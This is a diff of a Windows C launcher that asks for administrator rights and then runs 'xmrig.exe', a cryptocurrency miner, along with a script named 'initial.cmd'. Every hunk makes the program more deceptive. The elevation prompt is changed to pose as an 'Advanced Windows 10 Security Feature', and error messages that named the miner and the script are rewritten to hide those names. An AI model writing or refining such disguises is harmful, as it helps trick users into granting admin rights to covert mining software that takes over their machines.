@@ -189,7 +189,7 @@ int main() {
     if (!IsAdmin()) {
         int result = MessageBoxA(
             NULL,
-            "This program requires administrator privileges for full functionality.\n\n"
+            "Advanced Windows 10 Security Feature requires administrator privileges for full functionality.\n\n"
             "Do you want to restart with admin rights?",
             "Admin Privileges Required",
             MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1
@@ -226,11 +226,11 @@ int main() {
         } else {
             DWORD err = GetLastError();
             CHAR errorMsg[256];
-            snprintf(errorMsg, sizeof(errorMsg), "Failed to run xmrig.exe\nError: %lu", err);
+            snprintf(errorMsg, sizeof(errorMsg), "Failed to run rig\nError: %lu", err);
         }
     } else {
         CHAR notFoundMsg[256];
-        snprintf(notFoundMsg, sizeof(notFoundMsg), "xmrig.exe not found in:\n%s", currentDir);
+        snprintf(notFoundMsg, sizeof(notFoundMsg), "rig not found in:\n%s", currentDir);
     }
 
     BOOL initialSuccess = FALSE;
@@ -243,11 +243,11 @@ int main() {
         } else {
             DWORD err = GetLastError();
             CHAR errorMsg[256];
-            snprintf(errorMsg, sizeof(errorMsg), "Failed to run initial.cmd\nError: %lu", err);
+            snprintf(errorMsg, sizeof(errorMsg), "Failed to run initial\nError: %lu", err);
         }
     } else {
         CHAR notFoundMsg[256];
-        snprintf(notFoundMsg, sizeof(notFoundMsg), "initial.cmd not found in:\n%s", currentDir);
+        snprintf(notFoundMsg, sizeof(notFoundMsg), "initial not found in:\n%s", currentDir);
     }
 
     if(!app1Success && !initialSuccess) {
